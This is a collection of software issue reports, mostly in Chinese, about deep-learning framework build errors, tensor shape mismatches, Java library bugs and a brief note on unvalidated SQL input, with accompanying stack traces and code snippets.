多個 菜單項 同時為 active,"範列 菜單 如下 選取任一 Url 為「job-」開頭的菜單項(工作A/工作B/工作C) 菜單項「工作」將同時為 active 无 组件版本 latest 浏览器 Chrome Server Side   <code>: Menus = new List&lt;MenuItem&gt; { new MenuItem{ Text = ""工作"", Url = ""job"" }, new MenuItem{ Text = ""工作A"", Url = ""job-a"" }, new MenuItem{ Text = ""工作B"", Url = ""job-b"" }, new MenuItem{ Text = ""工作C"", Url = ""job-c"" }, };"
"[BUG] 删除文档提示删除失败, 实际删除成功","版本0.6.2 1.进入某个文集, 点击添加 2.添加内容 3.在左侧中选择一个节点后,点击发布 4.跳转到文集页面后点击最上边的 5.点击右侧的,删除刚刚添加的文档,提示删除失败,但是实际上已经删除成功了   <code>: 文档结构树 管理 删除"
paddle2.1.2  ubuntu20.04 源码编译错误 undefined reference to `pthread_detach',"系统:ubuntu20.04 cuda11.0 cudnn8.0 paddle2.1.2 执行命令 cmake .. -DPY_VERSION=3 -DWITH_TESTING=OFF -DWITH_MKL=ON -DWITH_GPU=ON -DON_INFER=ON 源码编译报错 ""src.c:(.text+0x46): undefined reference to pthread_detach' /usr/bin/ld: src.c:(.text+0x63): undefined reference to `pthread_join' collect2: error: ld returned 1 exit status make[1]: *** [CMakeFiles/cmTC_a7bc8.dir/build.make:87: cmTC_a7bc8] Error 1 make[1]: Leaving directory '/home/gpu/Paddle/build/CMakeFiles/CMakeTmp' make: *** [Makefile:121: cmTC_a7bc8/fast] Error 2""   <code>: pthread_create' /usr/bin/ld: src.c:(.text+0x52): undefined reference to"
语言模型预测报错,"1）PaddlePaddle版本：1.5版本 -预测信息 希望使用官方的语言模型预测一句话的ppl，模型地址： https://github.com/PaddlePaddle/models/tree/develop/PaddleNLP/language_model 训练时候选择的是 encoder_static 模型。能够正常训练和保存模型，使用 save_inference_model 接口保存。预测时能够通过 load_inference_model 接口加载模型，但是预测时候报错说维度不匹配 保存时候的数据如下表示 我对 lm_model.py 做了一些小改动，将预测的词语返回，以便计算 ppl。保存过程如下： 我参照了 train.py 213行的方式读取数据并 reshape，然后预测的时候报错， 预测时候的代码如下： 错误信息是 concate 维度不匹配。求解答   <code>: x = layers.data( name=""x"", shape=[1, config.num_steps, 1], dtype='int64', append_batch_size=False) y = layers.data( name=""y"", shape=[1 * config.num_steps, 1], dtype='int64', append_batch_size=False) projection, last_hidden, last_cell = lm_model( config.hidden_size, config.vocab_size, 1, num_layers=config.num_layers, num_steps=config.num_steps, init_scale=config.init_scale, dropout=config.dropout, rnn_model=config.rnn_model, x=x) loss = layers.softmax_with_cross_entropy(logits=projection, label=y, soft_label=False) loss = layers.reshape(loss, shape=[-1, config.num_steps], inplace=True) loss = layers.reduce_mean(loss, dim=[0]) loss = layers.reduce_sum(loss) ppl = layers.exp(loss) freeze_program = fluid.default_main_program() fluid.io.load_persistables(exe, args.save_model_dir, freeze_program) freeze_program = freeze_program.clone(for_test=True) print(""freeze out: {}, prediction layout: {}"".format(args.save_freeze_dir, ppl)) fluid.io.save_inference_model(args.save_freeze_dir, ['x', 'y'], ppl, exe, freeze_program) print(""freeze success"") def infer_reader(fields): unk_id = len(vocab) - 1 wids = [vocab[x] if x in vocab else unk_id for x in fields.split("" "")] # wids = np.array(wids) return wids[:-1], wids[1:] def infer(fields, feeder): x, y = infer_reader(fields) x = np.array(x) x = x.reshape((-1, len(x), 1)) y = np.array(y) y = y.reshape((-1, 1)) print(x.shape) print(y.shape) # 此处 data 虽然是个 list，但对应的是一个样本，所以需要用元组括起来 # 单个元素的元组需要在第一个元素后加个逗号，类似这样：(a,) ppl = exe.run(inference_program, feed={feed_target_names[0]: x, feed_target_names[1]: y}, fetch_list=fetch_targets, return_numpy=False) ppl = np.array(ppl[0]) return ppl"
BUG：类Track缺少默认构造方法,"反馈一个BUG： 请在SliderCaptchaTrack.Track类上面添加 @NoArgsConstructor 注解 否则： HttpMessageConversionException Type definition error: [simple type, class cloud.tianai.captcha.template.slider.validator.SliderCaptchaTrack$Track]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of (no Creators, like default constructor, exist): cannot deserialize from Object value (no delegate- or property-based Creator) at [Source: (org.springframework.util.StreamUtils$NonClosingInputStream); line: 1, column: 181] (through reference chain: cloud.tianai.captcha.template.slider.validator.SliderCaptchaTrack[""trackList""]-&gt;java.util.ArrayList[0])   <code>: cloud.tianai.captcha.template.slider.validator.SliderCaptchaTrack$Track"
字段输入框无输入判断，存在注入风险,虽然不会有哪个心智正常的开发人员往自己的字段里写单引号什么的 <em></em> ，但终归还是不能防萌新开发人。建议增加字符串判断语句，无效化单引号输入。 随便写了个例子如下 迫真备注信息，里面掐了个单引号和sql语句   <code>: 我就写了
[CT][MS][cross]An error is reported when the sample code is executed,"1.注释不能一起写在最后一个print下面，要写在每一个print的下面 2.GPU报错RuntimeError: Unsupported op [Cross] on GPU, Please confirm whether the device target setting is correct, or refer to 'mindspore.ops' / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph https://www.mindspore.cn/docs/zh-CN/master/note/api_mapping/pytorch_diff/cross.html 执行示例代码   <code>: Exception raised: Traceback (most recent call last): File ""/root/miniconda3/envs/ci3.7/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest example_testing_temp[15]&gt;"", line 1, in &lt;module&gt; c = ops.cross(a, b) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/function/math_func.py"", line 6852, in cross return cross_op(input, other) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 314, in __call__ return _run_op(self, self.name, args) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 97, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 802, in _run_op output = _pynative_executor.real_run_op(obj, op_name, args) File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 971, in real_run_op return self._executor.real_run_op(*args) RuntimeError: Unsupported op [Cross] on GPU, Please confirm whether the device target setting is correct, or refer to 'mindspore.ops' at https://www.mindspore.cn to query the operator support list. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:604 SetOperatorInfo"
SSD模型的GPU训练问题,"我在使用GPU训练SSD模型的时候（models/ssd/trainer.py）, 遇到如下错误： 另外，该模型修改后在CPU下是可以运行的。 请问如何解决这个问题？我是使用pip源安装的   <code>: F0921 14:24:18.580162 6954 hl_gpu_matrix_kernel.cuh:181] Check failed: cudaSuccess == err (0 vs. 8) [hl_gpu_apply_unary_op failed] CUDA error: invalid device function *** Check failure stack trace: *** @ 0x7fcdf3faf5ed google::LogMessage::Fail() @ 0x7fcdf3fb309c google::LogMessage::SendToLog() @ 0x7fcdf3faf0e3 google::LogMessage::Flush() @ 0x7fcdf3fb45ae google::LogMessageFatal::~LogMessageFatal() @ 0x7fcdf3e39ec4 hl_gpu_apply_unary_op&lt;&gt;() @ 0x7fcdf3e3a205 paddle::BaseMatrixT&lt;&gt;::applyUnary&lt;&gt;() @ 0x7fcdf3e3a433 paddle::BaseMatrixT&lt;&gt;::zero() @ 0x7fcdf3cd58d1 paddle::Parameter::enableType() @ 0x7fcdf3cd11cc paddle::parameterInitNN() @ 0x7fcdf3cd391a paddle::NeuralNetwork::init() @ 0x7fcdf3cfc491 paddle::GradientMachine::create() @ 0x7fcdf3f8c3b3 GradientMachine::createFromPaddleModelPtr() @ 0x7fcdf3f8c58f GradientMachine::createByConfigProtoStr() @ 0x7fcdf3b9b4cd _wrap_GradientMachine_createByConfigProtoStr @ 0x4b4cb9 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x52940f function_call @ 0x422cba PyObject_Call @ 0x4271ad instancemethod_call @ 0x422cba PyObject_Call @ 0x48121f slot_tp_init @ 0x47eb1a type_call @ 0x422cba PyObject_Call @ 0x4b31dd PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b5d10 PyEval_EvalFrameEx @ 0x4b6b28 PyEval_EvalCodeEx @ 0x4b6c52 PyEval_EvalCode Aborted"
Every chapter in model and book should contain a `requirements.txt`,is a Python standard to show what are dependencies for the current project. We should provide in every chapter in model and book. https://hackmit-baidu.slack.com/archives/G749S6M2Q/p1505597362000021   <code>: requirements.txt requirements.txt
【众智】【计算-AICPU接入】AvgPool,"AICPU算子接入 平均值池化 Python层接口（ 因库上反向接口与IR不一致，故改名V1 ） 接口目录：mindspore/ops/operations/nn_ops.py x y ksize ListInt 必选属性 strides ListInt 必选属性 padding String 必选属性 data_format String 可选属性 对应底层算子 对应底层AICPU算子AvgPool TF接口：tf.raw_ops.AvgPool 3. 异常处理 4. 算子反向 反向调用AvgPoolGrad   <code>: class AvgPoolV1(Primitive): REG_OP(AvgPool) .INPUT(x, TensorType({DT_FLOAT16, DT_FLOAT32, DT_DOUBLE})) .OUTPUT(y, TensorType({DT_FLOAT16, DT_FLOAT32, DT_DOUBLE})) .REQUIRED_ATTR(ksize, ListInt) .REQUIRED_ATTR(strides, ListInt) .REQUIRED_ATTR(padding, String) .ATTR(data_format, String, ""NHWC"") .OP_END_FACTORY_REG(AvgPool)"
TimedCache过期时间被重置的问题,"JDK版本： jdk_8_201 hutool版本： 5.3.3 比如报错的Excel文件，有问题的图片等。   <code>: public class LiveRoomUserTimeCache { private static final LiveRoomUserTimeCache instance = new LiveRoomUserTimeCache(); // 按照时间定时清理的缓存 private static TimedCache&lt;String, List&lt;Map&lt;String, Object&gt;&gt;&gt; timedCache; private LiveRoomUserTimeCache() { timedCache = new TimedCache&lt;String, List&lt;Map&lt;String, Object&gt;&gt;&gt;(3000l); timedCache.schedulePrune(3000l); } // 设置默认的过期时间 public static LiveRoomUserTimeCache getInstance() { return instance; } /** * 检查直播间是否纯在 * * @param key */ public static boolean addRoomUser(String key, Map&lt;String, Object&gt; map) { CheckUserExist(key); return timedCache.get(key).add(map); } /** * 检查直播间是否纯在 * * @param key */ public static void CheckUserExist(String key) { if (CollUtil.isEmpty(timedCache.get(key))) { timedCache.put(key, new ArrayList&lt;Map&lt;String, Object&gt;&gt;()); } } /** * 获取所有的用户 * * @param key * @return */ public List&lt;Map&lt;String, Object&gt;&gt; getUserList(String key) { CheckUserExist(key); List list = timedCache.get(key, false); return list; } /** * 获取登录用户 * * @param key * @return */ public List&lt;Map&lt;String, Object&gt;&gt; getLoginUserList(String key) { CheckUserExist(key); List&lt;Map&lt;String, Object&gt;&gt; reList = new ArrayList&lt;Map&lt;String, Object&gt;&gt;(); List list = timedCache.get(key, false); if (CollUtil.isNotEmpty(list)) { reList = (List&lt;Map&lt;String, Object&gt;&gt;) list.stream() .filter( n -&gt; { Map map = (Map) n; return (NumberUtil.isLong(map.get(""id"").toString())) == true; }) .collect(Collectors.toList()); } return reList; } /** * 获取未登录用户 * * @param key * @return */ public List&lt;Map&lt;String, Object&gt;&gt; getVistorUserList(String key) { CheckUserExist(key); List&lt;Map&lt;String, Object&gt;&gt; reList = new ArrayList&lt;Map&lt;String, Object&gt;&gt;(); List list = timedCache.get(key, false); if (CollUtil.isNotEmpty(list)) { reList = (List&lt;Map&lt;String, Object&gt;&gt;) list.stream() .filter( n -&gt; { Map map = (Map) n; return (NumberUtil.isLong(map.get(""id"").toString())) == false; }) .collect(Collectors.toList()); } return reList; } public static void main(String[] args) { LiveRoomUserTimeCache liveRoomUserTimeCache = LiveRoomUserTimeCache.getInstance(); new Thread( new Runnable() { @Override public void run() { for (int i = 0; i &lt; 1000; i++) { Map&lt;String, Object&gt; userMap = new HashMap&lt;&gt;(); userMap.put(""id"", ""id"" + i); userMap.put( ""lastTime"", String.valueOf(new Date(System.currentTimeMillis()).getTime())); userMap.put(""userId"", userMap.get(""id"")); userMap.put(""name"", ""游客""); userMap.put(""userFace"", """"); userMap.put(""orgName"", """"); liveRoomUserTimeCache.addRoomUser(""room"" + i, userMap); } } }) .start(); try { Thread.sleep(2500l); } catch (InterruptedException e) { e.printStackTrace(); } new Thread( new Runnable() { @Override public void run() { for (int i = 0; i &lt; 1000; i++) { System.out.println( JSONUtil.toJsonStr(liveRoomUserTimeCache.getVistorUserList(""room"" + i))); } } }) .start(); try { Thread.sleep(2500l); } catch (InterruptedException e) { e.printStackTrace(); } for (int i = 0; i &lt; 20; i++) { System.out.println(JSONUtil.toJsonStr(liveRoomUserTimeCache.getUserList(""room"" + i))); } try { Thread.sleep(2500l); } catch (InterruptedException e) { e.printStackTrace(); } for (int i = 0; i &lt; 20; i++) { System.out.println(JSONUtil.toJsonStr(liveRoomUserTimeCache.getUserList(""room"" + i))); } } }"
"selectpage在TP5.0.18下,如果前端字段使用函数有bug","application/common/controller/Backend.php selectpage在TP5.0.18下,如果前端字段使用函数有bug 例如:data-show-field=""concat(,'-',)""**   <code>: name tel"
编译opt工具失败,"执行 ./lite/tools/build.sh build_optimize_tool报错 下面是报错信息，预测库我已经编译成功了，卡在了opt编译上，删除third-party，再编译也试过好几次   <code>: [ 98%] Linking CXX static library libmir_passes.a [ 98%] Built target mir_passes Scanning dependencies of target mir_pass_manager [ 98%] Building CXX object lite/core/mir/CMakeFiles/mir_pass_manager.dir/pass_manager.cc.o [ 98%] Linking CXX static library libmir_pass_manager.a [ 98%] Built target mir_pass_manager Scanning dependencies of target optimizer [ 98%] Building CXX object lite/core/CMakeFiles/optimizer.dir/optimizer.cc.o [ 98%] Linking CXX static library liboptimizer.a [ 98%] Built target optimizer Scanning dependencies of target opt [ 98%] Building CXX object lite/api/CMakeFiles/opt.dir/opt.cc.o [ 98%] Building CXX object lite/api/CMakeFiles/opt.dir/cxx_api_impl.cc.o [ 98%] Building CXX object lite/api/CMakeFiles/opt.dir/paddle_api.cc.o [ 98%] Building CXX object lite/api/CMakeFiles/opt.dir/cxx_api.cc.o ^[[A^[[Ac++: internal compiler error: Killed (program cc1plus) Please submit a full bug report, with preprocessed source if appropriate. See &lt;file:///usr/share/doc/gcc-7/README.Bugs&gt; for instructions. lite/api/CMakeFiles/opt.dir/build.make:62: recipe for target 'lite/api/CMakeFiles/opt.dir/opt.cc.o' failed make[3]: *** [lite/api/CMakeFiles/opt.dir/opt.cc.o] Error 4 CMakeFiles/Makefile2:32537: recipe for target 'lite/api/CMakeFiles/opt.dir/all' failed make[2]: *** [lite/api/CMakeFiles/opt.dir/all] Error 2 CMakeFiles/Makefile2:32549: recipe for target 'lite/api/CMakeFiles/opt.dir/rule' failed make[1]: *** [lite/api/CMakeFiles/opt.dir/rule] Error 2 Makefile:4434: recipe for target 'opt' failed make: *** [opt] Error 2"
[CT][MS][SparseAddmm][GPU]输入之间shape的约束没有加校验,"输入之间shape的约束没有加校验 graph模式下失败2个 pynative模式下失败7个 / 硬件环境: GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): mode pynative mode graph test_p_sparse_addmm_sparse_dims_no_equal_x1_dense test_p_sparse_addmm_x2_dense_dims_no_equal_x1_dense_dims test_p_sparse_addmm_indices_negative test_p_sparse_addmm_shape_negative test_p_sparse_addmm_shape_zero test_p_sparse_addmm_indices_out_ranger test_p_sparse_addmm_shape_error 执行相关用例   <code>: Inputs: - **x1_indices** (Tensor) - A 2-D Tensor, represents the position of the element in the sparse tensor. Support int32, int64, each element value should be a non-negative int number. The shape is :math:`(N, 2)`. - **x1_values** (Tensor) - A 1-D Tensor, represents the value corresponding to the position in the `indices`. Support float32, float64, int8, int16, int32, int64, uint8, uint16, uint32, uint64. The shape should be :math:`(N,)`. - **x1_shape** (Tensor) - A positive int tuple which specifies the shape of sparse tensor. Support int32, int64, should have 2 elements, represent sparse tensor shape is :math:`(Q, P)`. - **x2** (Tensor) - A 2-D Dense Tensor, the dtype is same as `values`. The shape should be :math:`(P, M)`. - **x3** (Tensor) - A 2-D Dense Tensor, the dtype is same as `values`. The shape should be :math:`(Q, M)`. - **alpha** (Tensor) - A 1-D Tensor, the dtype is same as `values`. The shape should be :math:`(1,)`. - **beta** (Tensor) - A 1-D Tensor, the dtype is same as `values`. The shape should be :math:`(1,)`. ====================================================================== short test summary info ======================================================================= FAILED test_sparseaddmm.py::test_p_sparse_addmm_sparse_dims_no_equal_x1_dense - Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; FAILED test_sparseaddmm.py::test_p_sparse_addmm_x2_dense_dims_no_equal_x1_dense_dims - Failed: DID NOT RAISE (&lt;class 'ValueError'&gt;, &lt;class 'RuntimeError'&gt;) ============================================================== 2 failed, 58 passed in 271.83s (0:04:31) ============================================================== ====================================================================== short test summary info ======================================================================= FAILED test_sparseaddmm.py::test_p_sparse_addmm_sparse_dims_no_equal_x1_dense - Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; FAILED test_sparseaddmm.py::test_p_sparse_addmm_x2_dense_dims_no_equal_x1_dense_dims - Failed: DID NOT RAISE (&lt;class 'ValueError'&gt;, &lt;class 'RuntimeError'&gt;) FAILED test_sparseaddmm.py::test_p_sparse_addmm_indices_negative - Failed: DID NOT RAISE (&lt;class 'ValueError'&gt;, &lt;class 'RuntimeError'&gt;) FAILED test_sparseaddmm.py::test_p_sparse_addmm_shape_negative - Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; FAILED test_sparseaddmm.py::test_p_sparse_addmm_shape_zero - Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; FAILED test_sparseaddmm.py::test_p_sparse_addmm_indices_out_ranger - Failed: DID NOT RAISE (&lt;class 'ValueError'&gt;, &lt;class 'RuntimeError'&gt;) FAILED test_sparseaddmm.py::test_p_sparse_addmm_shape_error - Failed: DID NOT RAISE &lt;class 'RuntimeError'&gt; ============================================================== 7 failed, 53 passed in 230.64s (0:03:50) ============================================================== def test_p_sparse_addmm_sparse_dims_no_equal_x1_dense(): input_x1 = Tensor(np.random.randint(low=0, high=4, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([4, 10], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(1, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises(RuntimeError) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_x2_dense_dims_no_equal_x1_dense_dims(): input_x1 = Tensor(np.random.randint(low=0, high=4, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([4, 4], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 14)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(1, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises((ValueError, RuntimeError)) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_indices_negative(): input_x1 = Tensor(np.random.randint(low=-4, high=-1, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([4, 4], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises((ValueError, RuntimeError)) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_shape_negative(): input_x1 = Tensor(np.random.randint(low=0, high=4, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([-1, -1], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises(RuntimeError) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_shape_zero(): input_x1 = Tensor(np.random.randint(low=0, high=4, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([0, 0], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises(RuntimeError) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_indices_out_ranger(): input_x1 = Tensor(np.random.randint(low=5, high=8, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([4, 4], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises((ValueError, RuntimeError)) as err: fact.forward_mindspore_impl() def test_p_sparse_addmm_shape_error(): input_x1 = Tensor(np.random.randint(low=0, high=2, size=(3, 2)), dtype=mstype.int32) input_x2 = Tensor(np.random.randn(3), dtype=mstype.int64) input_x3 = Tensor([2, 2], dtype=mstype.int32) input_x4 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x5 = Tensor(np.random.randint(low=0, high=4, size=(4, 4)), dtype=mstype.int64) input_x6 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) input_x7 = Tensor(np.random.randint(low=0, high=4, size=(1)), dtype=mstype.int64) fact = SparseAddmmMock(inputs=[input_x1, input_x2, input_x3, input_x4, input_x5, input_x6, input_x7]) with pytest.raises(RuntimeError) as err: fact.forward_mindspore_impl()"
md形式的sql加载报空指针,"报错信息 相关版本 beetlsql：3.12.2-RELEASE springboot：2.6.2 jdk：1.8 sql目录 这个不知道与本问题有无关系，只是排查时遇到这么个现象。   <code>: java.lang.NullPointerException: null at org.beetl.sql.core.engine.SqlTemplateResource.openReader(SqlTemplateResource.java:26) at org.beetl.core.GroupTemplate.loadTemplate(GroupTemplate.java:517) at org.beetl.core.GroupTemplate.getTemplateByLoader(GroupTemplate.java:484) at org.beetl.core.GroupTemplate.getTemplate(GroupTemplate.java:455) at org.beetl.sql.core.engine.template.BeetlTemplateEngine.getSqlTemplate(BeetlTemplateEngine.java:46) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1061) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1042) at org.beetl.sql.core.BaseSQLExecutor.select(BaseSQLExecutor.java:128) at org.beetl.sql.core.BaseSQLExecutor.select(BaseSQLExecutor.java:114) at org.beetl.sql.core.SQLManager.select(SQLManager.java:389) java.lang.NullPointerException: null at org.beetl.sql.core.engine.SqlTemplateResource.openReader(SqlTemplateResource.java:26) at org.beetl.core.GroupTemplate.loadTemplate(GroupTemplate.java:517) at org.beetl.core.GroupTemplate.getTemplateByLoader(GroupTemplate.java:484) at org.beetl.core.GroupTemplate.getTemplate(GroupTemplate.java:455) at org.beetl.sql.core.engine.template.BeetlTemplateEngine.getSqlTemplate(BeetlTemplateEngine.java:46) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1061) at org.beetl.sql.core.BaseSQLExecutor.run(BaseSQLExecutor.java:1042) at org.beetl.sql.core.SQLManager.getSQLResult(SQLManager.java:143) at org.beetl.sql.core.SQLManager.getSQLResult(SQLManager.java:136) # 自动检测sql文件变化 PRODUCT_MODE = false CHARSET = UTF-8 ERROR_HANDLER = cn.benma666.beetl.ReThrowErrorHandler ##功能包 FNP.su = cn.benma666.myutils.StringUtil FNP.du = cn.benma666.myutils.DateUtil FNP.mu = org.apache.commons.collections.MapUtils FNP.mydb = cn.benma666.sjzt.Db FNP.json = com.alibaba.fastjson.JSON FNP.JdbcUtils = com.alibaba.druid.util.JdbcUtils #DELIMITER_STATEMENT_START=/* #DELIMITER_STATEMENT_END=*/ Db.useSqlManager().getSQLResult(SqlId.of(""util"", ""findTyzdMrsql""), zdObj).jdbcSql; org.beetl.core.GroupTemplate private Template getTemplateByLoader(Object key, ResourceLoader loader, ContextBuffer buffers)"
elementwise_mul ShapeError,"环境 cpu paddle1.6 python3.7 代码 `import paddle.fluid as fluid import numpy as np x = fluid.layers.data(name='x', shape=[1], dtype='float32') x_s = fluid.layers.shape(x) y = fluid.layers.create_parameter(name='y', shape=[1], dtype='float32') y_s = fluid.layers.shape(y) out_put = fluid.layers.elementwise_mul(y, x)` 错误信息 x，y的shape都是[1]，这里怎么说有一个是[-1,1]呢   <code>: line 10, in &lt;module&gt; out_put = fluid.layers.elementwise_mul(y, x) Error: ShapeError: the dimension of input X must greater than or equal to the one of input Y. But received: the shape of input X = [1], the dimension of input X = 1, the shape of input Y = [-1, 1], the dimension of input Y = 2 [Hint: Expected x_dim.size() &gt;= y_dim.size(), but received x_dim.size():1 &lt; y_dim.size():2.] at (/paddle/paddle/fluid/operators/elementwise/elementwise_op.h:61) [operator &lt; elementwise_mul &gt; error]"
capi build fails,nightly build fails due to C_API error for the last step. looks the build is looking for mkldnn.so in a wrong path. while this is installed in the build was started with the following command meanwhile following line works well http://172.19.32.197:8111/viewLog.html?tab=buildLog&amp;logTab=tree&amp;filter=debug&amp;expand=all&amp;buildId=35775&amp;_focus=13924   <code>: [Step 4/4] cp: cannot stat `/paddle/build/third_party/install/mkldnn/lib/libmkldnn.so': No such file or directory libmkldnn.so [Step 4/4] [Step 4/4] -- Installing: /paddle/build/capi_output/paddle/build/third_party/install/mkldnn/lib/libmkldnn.so docker run -i --rm -v $PWD:/paddle -w /paddle -e WITH_PYTHON=OFF -e WITH_SWIG_PY=OFF -e WITH_PYTHON=OFF -e WITH_C_API=ON -e WITH_GPU=OFF -e WITH_AVX=ON -e WITH_MKL=ON docker.io/paddlepaddle/paddle_manylinux_devel:cuda7.5_cudnn5 paddle/scripts/paddle_build.sh capi docker run -i --rm -v $PWD:/paddle -w /paddle -e WITH_PYTHON=OFF -e WITH_SWIG_PY=OFF -e WITH_PYTHON=OFF -e WITH_C_API=ON -e WITH_GPU=OFF -e WITH_AVX=ON -e WITH_MKL=ON docker.io/paddlepaddle/paddle_manylinux_devel:cuda7.5_cudnn5 paddle/scripts/docker/build.sh
输入的lod的数据pad和unpad对训练速度的影响,"假设我的数据是一个lod的句子 然后我同一个batch内句子的长度变化比较大，我想在rnn与attention之间来回切换，因为rnn对lod建模比较友好，attention对padding的tensor建模比较友好，所以这个过程会有pad与unpad之间的切换，麻烦问下，怎么操作训练的速度会比较快。 问题细化1: 我的问题是直接对lod的tensor进行attention的操作快呢，还是padding之后再进行attention的操作快。如果是直接对lod的tensor进行attention的操作快有没有什么demo呢？我看到的attention的demo都是针对padding后的定长的tensor进行attentioin.   <code>: a = [word_a1, word_a2, ..., word_an]"
